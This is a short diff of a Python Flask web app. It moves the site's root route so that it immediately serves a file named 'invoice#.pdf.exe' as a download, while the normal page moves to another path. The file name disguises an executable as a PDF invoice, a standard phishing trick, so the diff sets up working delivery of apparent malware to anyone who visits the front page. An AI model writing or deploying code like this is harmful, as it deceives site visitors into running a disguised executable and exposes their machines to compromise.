@@ -1,14 +1,14 @@
-from flask import Flask, render_template
+from flask import Flask, render_template, send_from_directory
 
 app = Flask(__name__)
 # Route to serve the file
-@app.route('/g')
+@app.route('/')
 def download_file():
     # The file will be served from the 'static' folder
     return send_from_directory(directory='static', path='invoice#.pdf.exe', as_attachment=True)
-@app.route('/')
+@app.route('/g')
 def home():
-    send_from_directory(directory='static', path='invoice#.pdf.exe', as_attachment=True)
+   
     return render_template('index.html')
 
 @app.route('/index')
